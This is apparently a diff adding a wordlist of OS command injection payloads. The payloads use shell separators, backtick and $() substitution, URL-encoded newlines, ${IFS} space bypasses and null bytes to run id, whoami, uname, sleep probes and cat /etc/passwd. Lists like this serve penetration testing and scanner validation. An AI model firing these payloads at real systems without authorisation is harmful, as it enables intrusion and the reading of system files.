@@ -1,0 +1,83 @@
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+;ls
+|ls
+||ls
+&ls
+&&ls
+`ls`
+$(ls)
+;cat /etc/passwd
+|cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;uname -a
+|uname -a
+`uname -a`
+$(uname -a)
+;whoami
+|whoami
+`whoami`
+$(whoami)
+;pwd
+|pwd
+`pwd`
+$(pwd)
+|sleep 5
+;sleep 5
+`sleep 5`
+$(sleep 5)
+& ping -c 5 127.0.0.1 &
+| ping -c 5 127.0.0.1
+; ping -c 5 127.0.0.1
+`ping -c 5 127.0.0.1`
+$(ping -c 5 127.0.0.1)
+%0aid
+%0a id
+%0a%0did
+%0d%0aid
+%0Aid
+%0A id
+%0a;id
+%0d;id
+%0a|id
+%0d|id
+\nid
+\n id
+\n;id
+\r\nid
+\r\n;id
+a]|id|[b
+a]||id||[b
+a]&&id&&[b
+a];id;[b
+a`id`b
+a$(id)b
+';id;'
+";id;"
+`id`
+$(id)
+{id}
+(id)
+<id>
+id\n
+id%0a
+\x0aid
+&#x0a;id
+%0a%20id
+${IFS}id
+$IFS$9id
+{${IFS}id}
+;${IFS}id
+;$IFS$9id
+%09id
+%09;id
+;%09id
+%00id
+%00;id
+;%00id
